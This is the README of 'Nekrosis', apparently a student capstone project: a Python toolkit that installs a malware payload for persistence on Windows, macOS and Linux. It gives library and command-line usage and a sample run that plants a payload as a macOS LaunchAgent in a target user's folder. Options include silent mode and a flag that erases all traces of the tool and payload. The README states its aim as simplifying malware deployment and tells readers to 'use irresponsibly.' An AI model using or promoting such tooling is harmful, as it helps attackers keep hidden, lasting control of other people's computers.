<div align="center">
             <img src="resources/icons/AppIcon.png" alt="App Icon" width="256" />
             <h1>Nekrosis</h1>
</div>

A multi-platform persistence toolkit, with the goal of simplifying malware deployment.

Developed as a capstone project for the Southern Alberta Institute of Technology's Information Systems Security program (Winter 2024), to demonstrate the many techniques that can be used to achieve persistence on Windows, macOS, and Linux.

Please use irresponsibly.

Note: This project is still in development, and is not yet ready for use.
* For contributors, see [CONTRIBUTING.md](CONTRIBUTING.md) for project architecture and design.

## Setup

Requires Python 3.6 or newer, install from official website when applicable: [python.org](https://www.python.org/downloads/).

Additional dependencies can be installed with pip:
```sh
python -m pip install -r requirements.txt
```


## Usage

Project designed to be used either as a library or as a standalone executable.

### Library

```python
from nekrosis import Nekrosis

nekrosis = Nekrosis("/path/to/malware")

nekrosis.supported_persistence_methods()
nekrosis.recommended_persistence_method()
nekrosis.install()
```


### Executable - Help
```
$ nekrosis (-h | --help)

>>> usage: nekrosis [-h] [-p PAYLOAD] [-m METHOD] [-v] [-l]
>>>
>>> Install a payload for persistence on Windows, macOS, or Linux.
>>>
>>> options:
>>>   -h, --help            show this help message and exit
>>>   -p PAYLOAD, --payload PAYLOAD
>>>                         The payload to install.
>>>   -m METHOD, --method METHOD
>>>                         The custom persistence method to use (optional).
>>>   -v, --version         show program's version number and exit
>>>   -l, --list-supported-methods
>>>                         List the supported persistence methods for the current OS.
>>>   -e {xml,json,plist}, --export {xml,json,plist}
>>>                         Export the supported persistence methods to STDOUT in the specified format.
>>>   -n, --nuke            Remove all traces of Nekrosis and the original payload.
>>>   -s, --silent          Suppress output.
```

### Executable - Install Payload

Best method determined by privilege and other environmental factors if no method is specified.
```
$ nekrosis (-p | --payload) <malware> (-m | --method) <method>

>>> Creating persistence
>>>   Payload: <malware>
>>>   OS: macOS
>>>   Effective User ID: 501
>>>   Persistence Method: "LaunchAgent - Current User"
>>> Installing launch service (LaunchAgent - Current User)
>>>   Relocated payload: /Users/target/Library/LaunchAgents/713753
>>>   Service file: /Users/target/Library/LaunchAgents/com.80309.plist
>>>   Service started successfully 🎉
```

Method can also be specified by index starting at 0, example:
```
  0 - "LaunchAgent - Current User"
  1 - "LaunchAgent - Electron"
```

## Authors

* [Ezra Fast](https://github.com/ezra-fast)
* [Mitchell Nicholson](https://github.com/1Kalagen1)
* [Mykola Grymalyuk](https://github.com/khronokernel)
* [Scott Banister](https://github.com/pleasantriess)
* [Ulysses Hill](https://github.com/Ulysses-Hill)
